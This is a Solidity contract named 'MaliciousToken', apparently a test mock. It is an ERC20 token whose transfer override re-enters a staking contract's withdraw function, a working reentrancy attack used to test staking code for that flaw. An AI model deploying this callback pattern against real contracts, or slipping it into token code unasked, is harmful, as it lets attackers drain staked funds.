// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IStakingRewards {
    function withdraw(uint256 amount) external;
}

contract MaliciousToken is ERC20 {
    IStakingRewards public staking;
    bool public attacking;
    uint256 public attackAmount;

    constructor() ERC20("Malicious Token", "MAL") {
        _mint(msg.sender, 1000000 * 1e18);
    }

    function setStaking(address _staking) external {
        staking = IStakingRewards(_staking);
    }

    function startAttack(uint256 amount) external {
        attacking = true;
        attackAmount = amount;
    }

    function stopAttack() external {
        attacking = false;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        if (attacking && msg.sender == address(staking)) {
            attacking = false;
            staking.withdraw(attackAmount);
        }
        return super.transfer(to, amount);
    }
}
